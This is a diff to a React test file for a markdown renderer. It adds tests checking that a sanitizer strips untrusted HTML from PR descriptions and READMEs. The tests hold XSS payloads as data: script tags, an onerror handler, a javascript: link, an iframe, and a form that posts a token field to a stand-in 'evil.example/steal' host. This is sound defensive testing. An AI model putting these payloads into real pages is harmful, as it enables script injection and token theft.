@@ -1,7 +1,6 @@
 import { describe, it, expect, vi } from 'vitest'
-import { render, screen, fireEvent, waitFor } from '@testing-library/react'
+import { render, screen, waitFor } from '@testing-library/react'
 import { MarkdownRenderer } from './MarkdownRenderer'
-import { CodeBlock } from './components/CodeBlock'
 import { MermaidBlock } from './components/MermaidBlock'
 
 const { mockRender } = vi.hoisted(() => ({
@@ -57,27 +56,9 @@ public class Main {
     expect(codeBlock).toBeInTheDocument()
     expect(screen.getByText('JAVA')).toBeInTheDocument()
     expect(codeBlock).toHaveTextContent('public class Main')
-  })
-
-  it('copies code block content to clipboard when copy button is clicked', async () => {
-    const writeTextMock = vi.fn().mockResolvedValue(undefined)
-    Object.assign(navigator, {
-      clipboard: {
-        writeText: writeTextMock,
-      },
-    })
-
-    render(<CodeBlock className="language-ts">const greeting = "Hello";</CodeBlock>)
-
-    const copyBtn = screen.getByTestId('code-block-copy-button')
-    expect(copyBtn).toBeInTheDocument()
-
-    fireEvent.click(copyBtn)
-
-    expect(writeTextMock).toHaveBeenCalledWith('const greeting = "Hello";')
-    await waitFor(() => {
-      expect(screen.getByText('Copié')).toBeInTheDocument()
-    })
+    // rehype-highlight has to keep running *after* the sanitizer, whose allow-list has no reason to
+    // know about `hljs-*` class names — this is what fails if the plugin order is ever swapped.
+    expect(codeBlock.querySelector('.hljs-keyword')).not.toBeNull()
   })
 
   it('renders raw HTML tags like div align="center", sub, and img with relative paths', () => {
@@ -95,6 +76,118 @@ public class Main {
     expect(img.getAttribute('src')).toContain('/Users/me/repo/docs/screenshots/app.png')
 
     expect(screen.getByText('Real screenshot')).toBeInTheDocument()
+  })
+})
+
+/**
+ * The renderer is fed PR descriptions, review comments and READMEs written by whoever opened the
+ * pull request or published the repository — `rehype-raw` hands all of that straight to the DOM, so
+ * these cases pin down what the sanitizer is expected to drop, and what a legitimate README still
+ * gets to use.
+ */
+describe('MarkdownRenderer — sanitization of untrusted HTML', () => {
+  it('strips script tags and their contents', () => {
+    const { container } = render(
+      <MarkdownRenderer content={'<script>alert("xss")</script>Plain text'} />
+    )
+
+    expect(container.querySelector('script')).toBeNull()
+    expect(container.innerHTML).not.toContain('alert')
+    expect(screen.getByText('Plain text')).toBeInTheDocument()
+  })
+
+  it('strips forms, which the app CSP does not cover (no form-action directive)', () => {
+    const { container } = render(
+      <MarkdownRenderer
+        content={'<form action="https://evil.example/steal"><input name="token" /></form>'}
+      />
+    )
+
+    expect(container.querySelector('form')).toBeNull()
+    expect(container.querySelector('input[name="token"]')).toBeNull()
+  })
+
+  it('strips iframes and inline event handlers', () => {
+    const { container } = render(
+      <MarkdownRenderer
+        content={'<iframe src="https://evil.example"></iframe><img src="x" onerror="alert(1)" />'}
+      />
+    )
+
+    expect(container.querySelector('iframe')).toBeNull()
+    expect(container.querySelector('[onerror]')).toBeNull()
+    expect(container.innerHTML).not.toContain('alert(1)')
+  })
+
+  it('strips javascript: links but keeps ordinary ones', () => {
+    render(
+      <MarkdownRenderer
+        content={'[bad](javascript:alert(1)) and [good](https://example.com/docs)'}
+      />
+    )
+
+    const [bad, good] = screen.getAllByTestId('markdown-link')
+    expect(bad).not.toHaveAttribute('href')
+    expect(good).toHaveAttribute('href', 'https://example.com/docs')
+  })
+
+  it('strips style attributes, which can be used to overlay the app UI', () => {
+    const { container } = render(
+      <MarkdownRenderer
+        content={'<div style="position:fixed;inset:0;background:#fff">Overlay</div>'}
+      />
+    )
+
+    expect(container.querySelector('[style*="fixed"]')).toBeNull()
+    expect(screen.getByText('Overlay')).toBeInTheDocument()
+  })
+
+  it('keeps the raw HTML a README legitimately uses', () => {
+    const { container } = render(
+      <MarkdownRenderer
+        content={
+          '<details><summary>More</summary><p>Hidden</p></details>' +
+          '<p><kbd>⌘K</kbd> then <b>Enter</b></p>' +
+          '<img src="https://example.com/badge.svg" alt="Badge" width="120" />'
+        }
+      />
+    )
+
+    expect(container.querySelector('details')).not.toBeNull()
+    expect(screen.getByText('More')).toBeInTheDocument()
+    expect(screen.getByText('⌘K')).toBeInTheDocument()
+    expect(screen.getByAltText('Badge')).toHaveAttribute('src', 'https://example.com/badge.svg')
+    expect(screen.getByAltText('Badge')).toHaveAttribute('width', '120')
+  })
+
+  it('keeps GFM column alignment through the sanitizer', () => {
+    const markdown = `
+| Left | Middle | Right |
+| :--- | :----: | ----: |
+| a | b | c |
+`
+    render(<MarkdownRenderer content={markdown} />)
+
+    expect(screen.getByText('Left')).toHaveClass('text-left')
+    expect(screen.getByText('Middle')).toHaveClass('text-center')
+    expect(screen.getByText('Right')).toHaveClass('text-right')
+    expect(screen.getByText('b')).toHaveClass('text-center')
+  })
+
+  it('gives headings ids, so a README table of contents has somewhere to link to', () => {
+    const { container } = render(<MarkdownRenderer content={'## Getting started\n\ntext'} />)
+
+    // Generated by rehype-slug, from the heading text — the anchor `[…](#getting-started)` expects.
+    expect(container.querySelector('#getting-started')).not.toBeNull()
+  })
+
+  it('keeps task list checkboxes and their checked state', () => {
+    render(<MarkdownRenderer content={'- [x] done\n- [ ] todo'} />)
+
+    const boxes = screen.getAllByRole('checkbox')
+    expect(boxes).toHaveLength(2)
+    expect(boxes[0]).toBeChecked()
+    expect(boxes[1]).not.toBeChecked()
   })
 })
 
